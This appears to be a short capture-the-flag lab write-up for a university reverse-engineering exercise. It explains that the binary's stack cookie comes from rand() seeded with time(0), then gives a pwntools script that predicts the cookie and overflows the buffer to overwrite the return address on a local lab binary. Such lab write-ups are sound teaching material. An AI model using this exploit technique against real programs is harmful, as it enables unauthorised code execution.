---
layout: post
title:  UNIBUC_RE_lab_5_task_3
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: task 2 revamped to include a stack cookie
categories:
- UNIBUC RE
---

task 2 revamped to include a stack cookie

Watching the main function, there is no way we can bypass that stack cookie soo we have to see how it is generated.
![](/assets/img/2022-09-01-22-47-18.png)

We can also do that random also we are given the libc version so this is the way.
Other than that it's business as usual ( done exactly like the second task).
```
from pwn import *

from ctypes import *
libc = CDLL("libc.so.6")
libc.srand(libc.time(0))
io = process("./task3")
rnd = libc.rand()
io.sendline("a"*8+'\0' +35*'a'+p32(rnd)+8*'a'+'\xf6\x11\x40\x00\x00\x00\x00')
io.interactive()
```